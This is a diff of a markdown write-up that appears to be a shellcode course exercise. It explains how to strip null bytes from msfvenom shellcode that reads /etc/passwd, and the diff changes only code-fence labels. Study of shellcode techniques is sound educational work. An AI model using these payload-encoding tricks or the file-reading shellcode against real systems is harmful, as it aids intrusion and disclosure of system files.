@@ -17,7 +17,7 @@ echo -n "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8\x03\x00\x0
 
 ## Disassembled Assembly
 
-```x86asm
+```assembly
 00000000  EB36              jmp short 0x38
 00000002  B805000000        mov eax,0x5
 00000007  5B                pop ebx
@@ -58,14 +58,14 @@ I noticed there were a lot of null bytes in the shellcode generated from msfveno
 
 The first substitution I made is replacing an `xor` with a `sub` to zero out the `ecx` register. Note that this strategy may not work with all CPUs.
 
-```x86asm
+```assembly
 ; xor ecx,ecx     ; replace xor instruction
 sub ecx,ecx
 ```
 
 Next, the original shellcodes does the jmp, call, pop technique to get a pointer to a string. The string is the filename to be read. In this case, I want to remove null bytes from my shellcode, thus I will push values to the stack and move the stack pointer into my register. To push the string terminating null, I will load the string "/etc//passwd" onto the stack and get a pointer to it's address.
 
-```x86asm
+```assembly
 ; pop ebx         ; <addr> 0x3D (filename from stack)
 xor ebx, ebx
 push ebx
@@ -77,7 +77,7 @@ mov ebx, esp
 
 Note that I have pushed an entire dword of `0x00000000` to the stack as a string terminator by the `push ebx` instruction. Interestingly, I tried to rewrite this to push only a single `0x0` to the stack. I ended up with this code that will essentially load a `0xff` into `ebx` that will be shifted out for a null and placed onto the stack as a null terminator.
 
-```x86asm
+```assembly
 mov ebx, 0x647773ff  
 shr ebx, 0x8
 push ebx
@@ -91,7 +91,7 @@ Unfortunately, this is an extra byte in length than the alternative solution abo
 
 Then, I change the `mov, 0x3` with an `xor` to clear the register and `mov al, 0x3` to move the value of 3 into the register without having zeros in the shellcode.
 
-```x86asm
+```assembly
 ; mov eax,0x3     ; read()
 xor eax, eax
 mov al, 0x3
@@ -99,14 +99,14 @@ mov al, 0x3
 
 Similar to the above strategy, I remove a `mov edx, 0x1000` with a `mov dh, 0x10` to remove nulls in the shellcode and have the same result.
 
-```x86asm
+```assembly
     ; mov edx,0x1000  ; buf = 4096
     mov dh, 0x10
 ```
 
 I again use the same trick as before to replace the `mov eax, 0x4` instruction:
    
-```x86asm
+```assembly
 ; mov eax,0x4     
 xor eax, eax
 mov al, 0x4 
@@ -114,7 +114,7 @@ mov al, 0x4
    
 And again with ebx. Except this time since I need a value of 1 in the register, I will use the `inc` instruction to increment it after setting it to 0x0.
 
-```x86asm
+```assembly
 ; mov ebx,0x1     ; 1 = stdout (where to write output)
 xor ebx, ebx
 inc ebx
@@ -122,7 +122,7 @@ inc ebx
 
 I do the same thing for the eax register later in the assembly code.
 
-```x86asm
+```assembly
 ; mov eax,0x1 
 xor eax, eax
 inc eax
@@ -130,7 +130,7 @@ inc eax
 
 I then replace a `mov ebx, 0x0` with an `xor` to remove null bytes in this instruction.
 
-```x86asm
+```assembly
 ; mov ebx,0x0     ; status = 0 = EXIT_SUCCESS
 xor ebx, ebx
 ```
@@ -141,7 +141,7 @@ And that's it for the changes.
 
 Here I have cleaned and commented the final `.asm` code. I have left the instructions I replaced commented out.
 
-```x86asm
+```assembly
 global _start
 
 section .text
